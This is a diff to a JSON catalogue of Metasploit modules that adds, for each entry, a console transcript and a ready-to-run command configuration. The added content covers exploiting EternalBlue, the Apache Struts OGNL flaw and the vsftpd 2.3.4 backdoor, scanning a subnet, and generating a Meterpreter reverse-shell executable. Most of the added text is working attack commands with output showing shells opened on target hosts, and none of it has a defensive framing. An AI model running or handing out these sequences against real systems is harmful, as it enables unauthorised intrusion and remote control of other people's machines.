@@ -1,22 +1,32 @@
 [
   {
     "name": "exploit/windows/smb/ms17_010_eternalblue",
-    "description": "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption"
+    "description": "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
+    "transcript": "msf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10\nmsf6 exploit(ms17_010_eternalblue) > run\n[*] Started reverse TCP handler on 0.0.0.0:4444\n[*] 192.168.1.10:445 - Connecting to target for exploitation...\n[+] 192.168.1.10:445 - The target is vulnerable.\n[*] Meterpreter session 1 opened",
+    "config": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <target>\nset LHOST <your_ip>\nrun"
   },
   {
     "name": "exploit/multi/http/struts2_content_type_ognl",
-    "description": "Apache Struts 2 Content-Type OGNL RCE"
+    "description": "Apache Struts 2 Content-Type OGNL RCE",
+    "transcript": "msf6 > use exploit/multi/http/struts2_content_type_ognl\nmsf6 exploit(struts2_content_type_ognl) > set RHOSTS 10.10.10.10\nmsf6 exploit(struts2_content_type_ognl) > run\n[*] Started reverse TCP handler...\n[*] 10.10.10.10:8080 - Exploiting...\n[*] Command shell session 1 opened",
+    "config": "use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS <target>\nset LHOST <your_ip>\nrun"
   },
   {
     "name": "exploit/unix/ftp/vsftpd_234_backdoor",
-    "description": "VSFTPD v2.3.4 Backdoor Command Execution"
+    "description": "VSFTPD v2.3.4 Backdoor Command Execution",
+    "transcript": "msf6 > use exploit/unix/ftp/vsftpd_234_backdoor\nmsf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.1.5\nmsf6 exploit(vsftpd_234_backdoor) > run\n[*] 192.168.1.5:21 - Banner: 220 (vsFTPd 2.3.4)\n[+] Backdoor service detected\n[*] Command shell session 1 opened",
+    "config": "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS <target>\nrun"
   },
   {
     "name": "auxiliary/scanner/portscan/tcp",
-    "description": "TCP Port Scanner"
+    "description": "TCP Port Scanner",
+    "transcript": "msf6 > use auxiliary/scanner/portscan/tcp\nmsf6 auxiliary(portscan/tcp) > set RHOSTS 192.168.1.0/24\nmsf6 auxiliary(portscan/tcp) > run\n[*] Scanning 256 hosts...\n[+] 192.168.1.1:80 - open\n[+] 192.168.1.1:22 - open\n[*] Scanned 256 of 256 hosts (100% complete)",
+    "config": "use auxiliary/scanner/portscan/tcp\nset RHOSTS <target_range>\nrun"
   },
   {
     "name": "payload/windows/meterpreter/reverse_tcp",
-    "description": "Windows Meterpreter Reverse TCP"
+    "description": "Windows Meterpreter Reverse TCP",
+    "transcript": "msf6 > use payload/windows/meterpreter/reverse_tcp\nmsf6 payload(reverse_tcp) > set LHOST 10.0.0.1\nmsf6 payload(reverse_tcp) > generate\n[*] Creating executable for payload...\n[+] Payload saved as shell.exe",
+    "config": "use payload/windows/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT 4444\ngenerate"
   }
 ]
